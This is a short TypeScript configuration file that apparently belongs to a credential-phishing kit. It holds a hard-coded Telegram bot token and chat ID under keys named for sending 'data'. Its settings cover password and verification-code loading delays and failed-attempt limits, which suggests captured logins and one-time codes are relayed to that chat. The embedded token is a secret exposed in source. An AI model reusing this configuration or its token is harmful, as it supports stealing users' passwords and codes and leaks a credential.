interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: "-1002612398407";
    data_token: "8120586219:AAGrM-hxCSkVrg6-Ef7kWzoYJqElq5c9R2o";
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 5000,
    max_failed_code_attempts: 0,
    max_failed_password_attempts: 0,
    password_loading_time: 5000,
  },
  telegram: {
    data_chatid: "-1002612398407",
    data_token: "8120586219:AAGrM-hxCSkVrg6-Ef7kWzoYJqElq5c9R2o",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
